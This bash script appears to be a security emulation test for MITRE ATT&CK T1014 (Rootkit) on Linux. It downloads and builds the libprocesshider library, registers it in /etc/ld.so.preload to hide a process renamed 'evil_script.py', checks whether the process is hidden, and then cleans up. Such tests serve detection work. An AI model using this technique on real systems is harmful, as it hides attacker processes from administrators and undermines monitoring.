#!/bin/bash

# Define variables
REPO_URL="https://github.com/gianlucaborello/libprocesshider"
REVISION="25e0587d6bf2137f8792dc83242b6b0e5a72b415"
LIBRARY_PATH="/usr/local/lib/libprocesshider.so"
EVIL_SCRIPT_PATH="/usr/local/bin/evil_script.py"
OUTPUT_DIR="./Linux_output/Defence_Evasion"
OUTPUT_FILE="${OUTPUT_DIR}/T1014_3_Defence_evasion.txt"

# Ensure the output directory exists
mkdir -p ${OUTPUT_DIR}

{
    echo "Installing prerequisites..."
    sudo apt update
    sudo apt install -y make gcc unzip curl
    echo "Prerequisites installed."

    echo "Cloning and building the library..."
    mkdir -p /tmp/SISA && cd /tmp/SISA
    curl -sLO ${REPO_URL}/archive/${REVISION}.zip
    unzip ${REVISION}.zip && cd libprocesshider-${REVISION}
    make
    sudo cp libprocesshider.so ${LIBRARY_PATH}
    echo "Library cloned and built."

    echo "Setting up the environment..."
    # Fallback mechanism for the location of the ping command
    if [ -f /usr/bin/ping ]; then
        PING_PATH="/usr/bin/ping"
    elif [ -f /bin/ping ]; then
        PING_PATH="/bin/ping"
    else
        echo "Error: ping command not found."
        exit 1
    fi

    sudo cp ${PING_PATH} ${EVIL_SCRIPT_PATH}
    echo "Environment setup complete."

    echo "Executing SISA Test #3 - dynamic-linker based rootkit (libprocesshider)..."
    echo "Defence Evasion T1014 is Executing."  # Indicate execution start
    echo ${LIBRARY_PATH} | sudo tee -a /etc/ld.so.preload
    ${EVIL_SCRIPT_PATH} localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
    echo "SISA Test #3 completed."

    echo "Cleaning up..."
    sudo sed -i "\:^${LIBRARY_PATH}:d" /etc/ld.so.preload
    sudo rm -rf ${LIBRARY_PATH} ${EVIL_SCRIPT_PATH} /tmp/SISA
    sudo depmod -a
    echo "Cleanup completed."

    echo "Storing output in ${OUTPUT_FILE}..."
} &> ${OUTPUT_FILE}

echo "Execution of Defence Evasion T1014 complete. Output stored in ${OUTPUT_FILE}."
